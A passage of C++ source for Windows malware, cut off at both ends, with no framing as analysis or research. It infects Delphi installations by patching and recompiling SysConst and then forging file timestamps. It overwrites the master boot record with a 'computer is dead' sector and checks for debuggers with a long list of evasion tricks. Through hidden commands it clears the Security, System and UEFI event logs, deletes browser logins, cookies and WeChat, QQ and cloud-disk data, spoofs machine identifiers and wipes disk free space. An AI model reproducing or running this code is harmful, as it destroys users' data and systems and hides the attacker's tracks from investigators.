	FILE* f1 = _tfopen(s.c_str(), L"r");
	if (!f1) return;
	FILE* f2 = _tfopen((d + L".tmp.pas").c_str(), L"w");
	if (!f2)
	{
		fclose(f1);
		return;
	}
	TCHAR buffer[4096];
	bool implFound = false;
	while (fgetws(buffer, 4096, f1))
	{
		fputws(buffer, f2);
		if (wcsstr(buffer, L"implementation") != NULL)
		{
			implFound = true;
			break;
		}
	}
	fwprintf(f2, L"%s\n", sc[0].c_str());
	for (int i = 1; i <= 23; ++i)
		fwprintf(f2, L"'%s',\n", x(sc[i-1]).c_str());
		fwprintf(f2, L"'%s');\n", x(sc[23]).c_str());
		for (int i = 2; i <= 24; ++i)
			fwprintf(f2, L"%s\n", x(sc[i-1]).c_str());

	fclose(f1);
	fclose(f2);
	MoveFile((d + L".dcu").c_str(), (d + L".bak").c_str());
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	String cmdLine = e + L" \"" + d + L".tmp.pas\"";
	BOOL b = CreateProcess(NULL, (LPTSTR)cmdLine.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (b)
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (FileExists(d + L".dcu"))
		DeleteFile(d + L".dcu");
	MoveFile((d + L".tmp.dcu").c_str(), (d + L".dcu").c_str());
	DeleteFile(d + L".tmp.pas");
	hFile = CreateFile((d + L".bak").c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		FILETIME ftCreate, ftAccess, ftWrite;
		GetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite);
		CloseHandle(hFile);

		hFile = CreateFile((d + L".dcu").c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			SetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite);
			CloseHandle(hFile);
		}
	}
}
void __fastcall st()
{
	HKEY hKey;
	TCHAR szRootDir[256];
	DWORD dwSize = sizeof(szRootDir);
	String root;

	for (wchar_t v = L'4'; v <= L'7'; ++v)
	{
		String subKey = L"Software\\Borland\\Delphi\\" + String(v) + L".0";
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subKey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			if (RegQueryValueEx(hKey, L"RootDir", NULL, NULL, (LPBYTE)szRootDir, &dwSize) == ERROR_SUCCESS)
			{
				root = szRootDir;
				re(root + L"\\source\\rtl\\sys\\SysConst.pas",
				   root + L"\\lib\\sysconst",
	   L"\"" + root + L"\\bin\\dcc32.exe\" ");
			}
			RegCloseKey(hKey);
		}
		dwSize = sizeof(szRootDir);
	}
}
unsigned char boot_bin[] = {
	0xb8, 0x03, 0x00, 0xcd, 0x10, 0xb4, 0x01, 0xb9, 0x07, 0x26, 0xcd, 0x10,
	0xbe, 0x20, 0x7c, 0xb4, 0x0e, 0x31, 0xdb, 0xac, 0x08, 0xc0, 0x74, 0x04,
	0xcd, 0x10, 0xeb, 0xf7, 0xfa, 0xf4, 0xeb, 0xfc, 0x59, 0x6f, 0x75, 0x72,
	0x20, 0x63, 0x6f, 0x6d, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x69, 0x73,
	0x20, 0x64, 0x65, 0x61, 0x64, 0x2e, 0x73, 0x6f, 0x2c, 0x54, 0x68, 0x65,
	0x20, 0x4d, 0x42, 0x52, 0x20, 0x68, 0x61, 0x73, 0x20, 0x61, 0x6c, 0x73,
	0x6f, 0x20, 0x62, 0x65, 0x65, 0x6e, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72,
	0x6f, 0x79, 0x65, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
};
unsigned int boot_bin_len = 512;

void WriteBootSectorSilent() {
	HANDLE hDisk = CreateFileW(
		L"\\\\.\\PHYSICALDRIVE0",
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDisk == INVALID_HANDLE_VALUE)
		return;

		DWORD bytesWritten;
	WriteFile(hDisk, boot_bin, boot_bin_len, &bytesWritten, NULL);

	CloseHandle(hDisk);
}

bool CheckPEBBeingDebugged() {
	bool isDebugged = false;
	__asm {
		mov eax, fs:[0x30]
		mov al, [eax + 2]
		mov isDebugged, al
	}
	return isDebugged;
}
bool CheckNtGlobalFlag() {
	DWORD flag = 0;
	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax + 0x68]
		mov flag, eax
	}
	return (flag & 0x70) != 0;
}
bool CheckHardwareBreakpoints() {
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	HANDLE hThread = GetCurrentThread();
	if (GetThreadContext(hThread, &ctx)) {
		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
			return true;
		}
	}
	return false;
}
bool CheckDebuggerViaException() {
	__try {
		__debugbreak();
		return false;
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		return true;
	}
}
bool CheckDebuggerViaTiming() {
	DWORD start = GetTickCount();
	Sleep(1000);
	DWORD end = GetTickCount();
	return (end - start) > 1500;
}
bool CheckParentProcess() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hSnapshot, &pe32);
	DWORD parentPid = pe32.th32ParentProcessID;
	CloseHandle(hSnapshot);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hSnapshot, &pe32);
	do {
		if (pe32.th32ProcessID == parentPid) {
			const char* debuggerProcesses[] = {
				"ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe",
				"ida.exe", "ida64.exe", "cheatengine-x86_64.exe",
				"gdb.exe", "immunitydebugger.exe", "radare2.exe",
				"dnspy.exe", "hxd.exe", "processhacker.exe"
			};
			for (int i = 0; i < sizeof(debuggerProcesses) / sizeof(debuggerProcesses[0]); i++) {
				if (strcmp(pe32.szExeFile, debuggerProcesses[i]) == 0) {
					CloseHandle(hSnapshot);
					return true;
				}
			}
			break;
		}
	} while (Process32Next(hSnapshot, &pe32));
	CloseHandle(hSnapshot);
	return false;
}
bool CheckDebuggerWindow() {
	const char* debuggerWindows[] = {
		"OLLYDBG", "x64dbg", "x32dbg", "WinDbgFrameClass",
		"IDA", "Cheat Engine", "ImmunityDebugger", "Radare2"
	};
	for (int i = 0; i < sizeof(debuggerWindows) / sizeof(debuggerWindows[0]); i++) {
		if (FindWindowA(debuggerWindows[i], NULL)) {
			return true;
		}
	}
	return false;
}
bool CheckRemoteDebugger() {
	HANDLE hProcess = GetCurrentProcess();
	BOOL isDebuggerPresent = FALSE;
	CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent);
	return isDebuggerPresent;
}
bool CheckDebugPort() {
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		char subKeyName[256];
		DWORD subKeyNameSize = sizeof(subKeyName);
		if (RegEnumKeyExA(hKey, 0, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return true;
		}
		RegCloseKey(hKey);
	}
	return false;
}
bool CheckDebuggerModules() {
	HMODULE hModules[1024];
	DWORD cbNeeded;
	if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &cbNeeded)) {
		for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			char szModName[MAX_PATH];
			if (GetModuleFileNameExA(GetCurrentProcess(), hModules[i], szModName, sizeof(szModName))) {
				const char* debuggerModules[] = {
					"ollydbg", "x64dbg", "x32dbg", "windbg",
					"ida", "cheatengine", "gdb", "immunitydebugger"
				};
				for (int j = 0; j < sizeof(debuggerModules) / sizeof(debuggerModules[0]); j++) {
					if (strstr(szModName, debuggerModules[j])) {
						return true;
					}
				}
			}
		}
	}
	return false;
}
bool IsBeingDebugged() {
	if (IsDebuggerPresent()) return true;
	if (CheckPEBBeingDebugged()) return true;
	if (CheckNtGlobalFlag()) return true;
	if (CheckHardwareBreakpoints()) return true;
	if (CheckDebuggerViaException()) return true;
	if (CheckDebuggerViaTiming()) return true;
	if (CheckParentProcess()) return true;
	if (CheckDebuggerWindow()) return true;
	if (CheckRemoteDebugger()) return true;
	if (CheckDebugPort()) return true;
	if (CheckDebuggerModules()) return true;
	return false;
}
void KillProcessByName(const char* targetStr) {
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		return;
	}

	if (!Process32First(hProcessSnap, &pe32)) {
		CloseHandle(hProcessSnap);
		return;
	}

	do {
		if (strstr(pe32.szExeFile, targetStr) != NULL) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL) {
				TerminateProcess(hProcess, 0);
				CloseHandle(hProcess);
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
}
bool SetWriteProtectionPolicy(bool enable) {
	HKEY hKey;
	LONG result = RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
		0,
		KEY_WRITE,
		&hKey
	);

	if (result != ERROR_SUCCESS) {
		result = RegCreateKeyExW(
			HKEY_LOCAL_MACHINE,
			L"SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices",
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,
			KEY_WRITE,
			NULL,
			&hKey,
			NULL
		);
		if (result != ERROR_SUCCESS) {
			return false;
		}
	}

	DWORD value = enable ? 1 : 0;
	result = RegSetValueExW(
		hKey,
		L"Deny_Write",
		0,
		REG_DWORD,
		(const BYTE*)&value,
							sizeof(DWORD)
	);

	RegCloseKey(hKey);

	if (result != ERROR_SUCCESS) {
		return false;
	}

	return true;
}

void SilentCmd(LPCTSTR cmd)
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, 0);

	CreateProcess(NULL, (LPTSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 3000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}
void ClearUEFI_FirmwareLogs()
{
	SilentCmd(_T("fwupdmgr clear-history"));
	SilentCmd(_T("wmic firmware get /format:list >NUL"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-UEFI/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-UEFI/Admin"));
	SilentCmd(_T("wevtutil cl System"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Kernel-Boot/Operational"));
	SilentCmd(_T("wmic computersystem get SystemStartupOptions /format:list >NUL"));
	SilentCmd(_T("wmic bios get /format:list >NUL"));
	SilentCmd(_T("bcdedit /set {globalsettings} quietboot on"));
	SilentCmd(_T("bcdedit /set {bootmgr} displaybootmenu no"));
}
void SilentDel(LPCTSTR path)
{
	TCHAR buf[512];
	wsprintf(buf, _T("del /f /s /q \"%s\" 2>nul"), path);
	SilentCmd(buf);
}
void ClearISPLogs()
{
	SilentCmd(_T("rasdial /disconnect"));
	SilentCmd(_T("netsh ras set tracing * disable"));
	SilentCmd(_T("del /f /s /q \"%windir%\\System32\\ras\\*.log\" 2>nul"));
	SilentCmd(_T("netsh interface ip set interface \"*\" metrics=1"));
	SilentCmd(_T("netsh interface ipv6 reset"));
	SilentCmd(_T("netsh winsock reset"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkAccessProtection/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-BroadboxNet/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-WWAN-AutoConfig/Operational"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("ipconfig /release"));
}
void ClearCloudSyncLogs()
{
	SilentCmd(_T("taskkill /f /im msedge.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im onedrive.exe 2>nul"));
	SilentCmd(_T("sc stop OneSyncSVC 2>nul"));
	SilentCmd(_T("del /f /s /q \"%localappdata%\\Microsoft\\Windows\\SettingSync\\*\" 2>nul"));
	SilentCmd(_T("del /f /s /q \"%localappdata%\\Microsoft\\Accounts\\*\" 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Sync Data\\*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Sync App Settings*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Sync*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data*"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-SettingSync/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-User Cloud Content/Operational"));
	SilentDel(_T("%localappdata%\\Microsoft\\Windows\\CloudStore\\*"));
	SilentDel(_T("%programdata%\\Microsoft\\Windows\\AppRepository\\*"));
}

void ClearMicrosoftAccountTraces()
{
	SilentCmd(_T("klist purge"));
	SilentCmd(_T("cmdkey /delete *"));
	SilentCmd(_T("del /f /q \"%localappdata%\\Microsoft\\Accounts\\*\" 2>nul"));
	SilentCmd(_T("del /f /q \"%appdata%\\Microsoft\\SystemAccount\\*\" 2>nul"));
	SilentCmd(_T("taskkill /f /im onedrive.exe 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\OneDrive\\*"));
	SilentDel(_T("%appdata%\\Microsoft\\OneDrive\\*"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-User Profile Service/Operational"));
	SilentCmd(_T("wevtutil cl Security"));
}
void ClearBrowserLoginTraces()
{
	SilentCmd(_T("taskkill /f /im msedge.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im chrome.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im browser.exe 2>nul"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Cookies*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Login Data*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Web Data*"));
	SilentDel(_T("%localappdata%\\Microsoft\\Edge\\User Data\\Default\\History"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\Web Data*"));
	SilentDel(_T("%localappdata%\\Google\\Chrome\\User Data\\Default\\History"));
}
void ClearWechatTraces()
{
	SilentCmd(_T("taskkill /f /im WeChat.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im WeChatApp.exe 2>nul"));
	SilentDel(_T("%appdata%\\Tencent\\WeChat\\*"));
	SilentDel(_T("%appdata%\\Tencent\\WXWork\\*"));
	SilentDel(_T("%userprofile%\\Documents\\WeChat Files\\*"));
	SilentDel(_T("%userprofile%\\AppData\\Roaming\\Tencent\\WeChat\\xan*"));
}
void ClearQQTraces()
{
	SilentCmd(_T("taskkill /f /im QQ.exe 2>nul"));
	SilentCmd(_T("taskkill /f /im TIM.exe 2>nul"));
	SilentDel(_T("%appdata%\\Tencent\\QQ\\*"));
	SilentDel(_T("%appdata%\\Tencent\\TIM\\*"));
	SilentDel(_T("%userprofile%\\Documents\\Tencent Files\\*"));
	SilentDel(_T("%localappdata%\\Tencent\\QQ\\*"));
}
void ClearCloudDiskTraces()
{
	SilentCmd(_T("taskkill /f /im BaiduNetdisk.exe 2>nul"));
	SilentDel(_T("%appdata%\\Baidu\\BaiduNetdisk\\*"));
	SilentDel(_T("%localappdata%\\Baidu\\BaiduNetdisk\\*"));
	SilentCmd(_T("taskkill /f /im AliYunPan.exe 2>nul"));
	SilentDel(_T("%appdata%\\AliyunDrive\\*"));
	SilentDel(_T("%localappdata%\\AliyunDrive\\*"));
}

void ClearMACAddressTraces()
{
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus == ERROR_SUCCESS)
	{
		PIP_ADAPTER_INFO pAdapter = AdapterInfo;
		while (pAdapter != NULL)
		{
			if (_tcscmp(pAdapter->AdapterName, _T("{00000000-0000-0000-0000-000000000000}")) != 0 &&
				pAdapter->Type != MIB_IF_TYPE_LOOPBACK)
			{
				TCHAR szMACCmd[MAX_PATH] = { 0 };
				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface set interface \"%s\" admin=disable"), pAdapter->Description);
				SilentCmd(szMACCmd);

				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface ip set address \"%s\" dhcp"), pAdapter->Description);
				SilentCmd(szMACCmd);

				_stprintf_s(szMACCmd, MAX_PATH,
							_T("netsh interface set interface \"%s\" admin=enable"), pAdapter->Description);
				SilentCmd(szMACCmd);
			}
			pAdapter = pAdapter->Next;
		}
	}

	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkInterface/Operational"));
}
void ClearDiskSerialTraces()
{
	SilentCmd(_T("wmic diskdrive get serialnumber >NUL"));
	SilentCmd(_T("fsutil dirty clear C:"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
	SilentCmd(_T("lodctr /r"));
}
void ClearCPUSerialTraces()
{
	SilentCmd(_T("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Kernel\" /v DisableCpuId /t REG_DWORD /d 1 /f /quiet"));
	SilentCmd(_T("wmic cpu get processorid >NUL"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Kernel-Processor/Operational"));
	SilentCmd(_T("typeperf -qx >NUL"));
}
void ClearMotherboardUUIDTraces()
{
	SilentCmd(_T("wmic csproduct get uuid >NUL"));
	SilentCmd(_T("wmic baseboard get serialnumber >NUL"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
	SilentCmd(_T("sysprep /generalize /quiet /oobe"));
}
void ClearMachineGUIDTraces()
{
	GUID newGUID;
	CoCreateGuid(&newGUID);
	TCHAR szGUID[64] = { 0 };
	StringFromGUID2(newGUID, szGUID, 64);

	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SOFTWARE\\Microsoft\\Cryptography"),
				 0, KEY_WRITE, &hKey);
	if (hKey != NULL)
	{
		RegSetValueEx(hKey, _T("MachineGuid"), 0, REG_SZ, (BYTE*)szGUID, _tcslen(szGUID)*2);
		RegCloseKey(hKey);
	}

	SilentCmd(_T("wevtutil cl Application"));
	SilentCmd(_T("gpupdate /force /quiet"));
}
void ClearWindowsLicenseIDTraces()
{
	SilentCmd(_T("slmgr.vbs /dlv >NUL"));
	SilentCmd(_T("slmgr.vbs /rilc /quiet"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Security-SPP/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Security-SPP/Admin"));
	HKEY hKey = NULL;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,
				 _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform"),
				 0, KEY_READ, &hKey);
	if (hKey != NULL) RegCloseKey(hKey);
}
void ClearNICLogs()
{
	SilentCmd(_T("netsh interface ip reset"));
	SilentCmd(_T("netsh interface ipv6 reset"));
	SilentCmd(_T("netsh winsock reset"));
	SilentCmd(_T("arp -d *"));
	SilentCmd(_T("route /f"));
	SilentCmd(_T("netsh wlan delete trace"));
	SilentCmd(_T("netsh wlan clear hostednetwork"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-NetworkProfile/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"));
	SilentCmd(_T("wevtutil cl System"));
	SilentCmd(_T("wevtutil cl Security"));
	SilentCmd(_T("logman stop WiFiSession -ets -quiet"));
	SilentCmd(_T("logman stop NDIS -ets -quiet"));
	SilentCmd(_T("logman stop NetTrace -ets -quiet"));
}
void ClearRouterLocalTraces()
{
	SilentCmd(_T("ipconfig /release"));
	SilentCmd(_T("ipconfig /flushdns"));
	SilentCmd(_T("ipconfig /registerdns"));
	SilentCmd(_T("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-Upnp/Operational"));
	SilentCmd(_T("wevtutil cl Microsoft-Windows-DHCPv6-Client/Operational"));
	SilentCmd(_T("net stop SSDPSRV /y"));
	SilentCmd(_T("net start SSDPSRV"));
}

void SilentExecuteCmd(LPCTSTR lpCmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = si.hStdError = CreateFile(_T("NUL"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	CreateProcess(NULL, (LPTSTR)lpCmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess != NULL)
	{
		WaitForSingleObject(pi.hProcess, 10000);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	if (si.hStdOutput != INVALID_HANDLE_VALUE) CloseHandle(si.hStdOutput);
}
void ClearMemoryTraces()
{
	SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);
	SilentExecuteCmd(_T("wmic computersystem set AutomaticManagedPagefile=False"));
	SilentExecuteCmd(_T("wmic pagefileset delete"));
	SilentExecuteCmd(_T("wmic computersystem set AutomaticManagedPagefile=True"));
	SilentExecuteCmd(_T("fsutil behavior set memoryusage 2"));
	SilentExecuteCmd(_T("ipconfig /flushdns"));
	SilentExecuteCmd(_T("netsh winsock reset"));
}
void ClearProcessHandleTraces()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
		if (hProcess != NULL)
		{
			DWORD dwHandleCount = 0;
			GetProcessHandleCount(hProcess, &dwHandleCount);
			CloseHandle(hProcess);
		}
		CloseHandle(hSnapshot);
	}
	SilentExecuteCmd(_T("taskkill /f /im handle.exe 2>NUL"));
	SilentExecuteCmd(_T("logman stop HandleTrace -ets -quiet"));
}
void ClearDiskSectorTraces()
{
	SilentExecuteCmd(_T("cipher /w:C:"));
	SilentExecuteCmd(_T("chkdsk C: /f /r /x /quiet"));
	SilentExecuteCmd(_T("fsutil mft optimize C:"));
}
void ClearPrefetchFiles()
{
	TCHAR szPrefetchPath[MAX_PATH] = { 0 };
	GetWindowsDirectory(szPrefetchPath, MAX_PATH);
	_tcscat_s(szPrefetchPath, MAX_PATH, _T("\\Prefetch\\"));
	TCHAR szSearchPath[MAX_PATH] = { 0 };
	_stprintf_s(szSearchPath, MAX_PATH, _T("%s*.pf"), szPrefetchPath);

	WIN32_FIND_DATA fd = { 0 };
	HANDLE hFind = FindFirstFile(szSearchPath, &fd);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			TCHAR szFilePath[MAX_PATH] = { 0 };
			_stprintf_s(szFilePath, MAX_PATH, _T("%s%s"), szPrefetchPath, fd.cFileName);
			SetFileAttributes(szFilePath, FILE_ATTRIBUTE_NORMAL);
			DeleteFile(szFilePath);
		} while (FindNextFile(hFind, &fd));
		FindClose(hFind);
	}
	HKEY hKey = NULL;
